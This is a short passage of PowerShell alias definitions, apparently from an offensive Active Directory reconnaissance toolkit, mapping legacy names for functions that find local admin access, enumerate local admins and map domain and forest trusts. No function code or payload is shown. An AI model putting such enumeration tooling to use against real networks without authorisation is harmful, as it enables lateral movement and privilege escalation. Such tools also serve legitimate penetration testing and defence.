Set-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccess
Set-Alias Get-NetDomainTrusts Get-NetDomainTrust
Set-Alias Get-NetForestTrusts Get-NetForestTrust
Set-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrust
Set-Alias Invoke-FindUserTrustGroups Find-ForeignUser
Set-Alias Invoke-FindGroupTrustUsers Find-ForeignGroup
Set-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdmin
